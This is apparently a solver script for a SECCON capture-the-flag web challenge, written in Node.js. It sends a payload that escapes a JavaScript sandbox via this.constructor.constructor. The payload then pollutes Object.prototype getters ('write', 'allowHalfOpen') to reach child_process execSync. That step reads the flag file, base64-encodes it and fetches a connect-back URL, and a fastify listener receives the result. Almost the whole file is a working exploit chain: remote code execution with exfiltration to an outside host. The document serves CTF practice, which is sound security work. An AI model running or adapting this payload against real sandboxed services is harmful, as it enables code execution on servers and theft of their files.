const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const WEB_BASE_URL = `http://${process.env.SECCON_HOST ?? "localhost"}:3000`;
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const code = `
);

const HostFunction = this.constructor.constructor;
const HostObject = HostFunction("return {}")().constructor;

const code = \`
  import("node:child_process").then(
    ({ execSync }) => execSync(\\\`echo "fetch('${CONNECTBACK_URL}?flag=$(cat /flag-*.txt | base64 -w0)')" | node\\\`)
  )
\`;

HostObject.prototype.__defineGetter__('write', HostFunction.bind(null, code));
HostObject.prototype.__defineSetter__('write', _=>_);

HostObject.prototype.__defineGetter__('allowHalfOpen', function() {
  // Prevent from calling the 'HostObject.prototype.write' getter on https://github.com/nodejs/node/blob/v22.9.0/lib/internal/streams/duplex.js#L109
  HostObject.setPrototypeOf(this, null);
});
HostObject.prototype.__defineSetter__('allowHalfOpen', _=>_);

"exploit"; //
`.trim();

app.get("/", async (req, reply) => {
  // You got a flag!
  console.log(atob(req.query.flag));
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err.toString());

  await sleep(3 * 1000);
  await fetch(WEB_BASE_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ code }),
  });

  await sleep(5 * 1000);
  fail("Failed");
});
